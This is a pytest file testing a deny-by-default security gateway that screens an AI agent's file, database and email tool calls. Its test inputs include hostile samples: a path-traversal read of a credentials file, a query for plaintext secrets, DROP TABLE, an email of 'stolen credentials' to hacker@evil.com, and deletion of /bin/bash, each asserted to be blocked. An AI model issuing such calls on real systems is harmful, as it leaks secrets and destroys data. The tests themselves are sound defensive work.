"""
Tests for Security Gateway, Policies, and Deny-by-Default Architecture.
"""

import pytest
from app.gateway.gateway import SecurityGateway
from app.gateway.policy_engine import (
    PolicyEngine,
    get_default_strict_policy_set,
    get_permissive_policy_set,
)
from app.models.schemas import DecisionOutcome, ToolInvocationRequest


@pytest.fixture
def gateway():
    return SecurityGateway(PolicyEngine(get_default_strict_policy_set()))


def test_allow_legitimate_public_file(gateway):
    req = ToolInvocationRequest(
        tool_name="read_file",
        arguments={"path": "public/company_handbook.txt"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is True
    assert decision.decision == DecisionOutcome.ALLOW
    assert res.executed is True
    assert "TraceGuard AI Employee Handbook" in res.output
    assert audit.executed is True
    assert audit.data_exposure_detected is False


def test_deny_restricted_credentials_file(gateway):
    req = ToolInvocationRequest(
        tool_name="read_file",
        arguments={"path": "restricted/credentials.env"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is False
    assert decision.decision == DecisionOutcome.DENY
    assert "Access to protected path prefix" in decision.reason
    # CRITICAL: Tool was NEVER executed
    assert res.executed is False
    assert audit.executed is False


def test_deny_path_traversal(gateway):
    req = ToolInvocationRequest(
        tool_name="read_file",
        arguments={"path": "../../../restricted/credentials.env"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is False
    assert decision.decision == DecisionOutcome.DENY
    assert "Directory traversal pattern detected" in decision.reason
    assert res.executed is False


def test_allow_catalog_query(gateway):
    req = ToolInvocationRequest(
        tool_name="query_database",
        arguments={"query": "SELECT * FROM products LIMIT 2"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is True
    assert res.executed is True
    assert len(res.output) == 2


def test_deny_confidential_table_query(gateway):
    req = ToolInvocationRequest(
        tool_name="query_database",
        arguments={"query": "SELECT service_name, plaintext_mock_secret FROM api_tokens"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is False
    assert decision.decision == DecisionOutcome.DENY
    assert "targets confidential table" in decision.reason
    assert res.executed is False


def test_deny_destructive_sql(gateway):
    req = ToolInvocationRequest(
        tool_name="query_database",
        arguments={"query": "DROP TABLE products;"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is False
    assert "disallowed mutation keyword" in decision.reason
    assert res.executed is False


def test_allow_internal_email(gateway):
    req = ToolInvocationRequest(
        tool_name="send_email",
        arguments={
            "to": "helpdesk@traceguard.internal",
            "subject": "Status",
            "body": "System check passed.",
        },
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is True
    assert res.executed is True


def test_deny_external_email(gateway):
    req = ToolInvocationRequest(
        tool_name="send_email",
        arguments={
            "to": "hacker@evil.com",
            "subject": "Stolen credentials",
            "body": "Secret dump",
        },
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is False
    assert decision.decision == DecisionOutcome.DENY
    assert "not within authorized domains" in decision.reason
    assert res.executed is False


def test_deny_unregistered_tool(gateway):
    req = ToolInvocationRequest(
        tool_name="delete_system_file",
        arguments={"path": "/bin/bash"},
        agent_type="mock",
    )
    decision, res, audit = gateway.invoke(req)
    assert decision.allowed is False
    assert "not a registered protected tool" in decision.reason
    assert res.executed is False
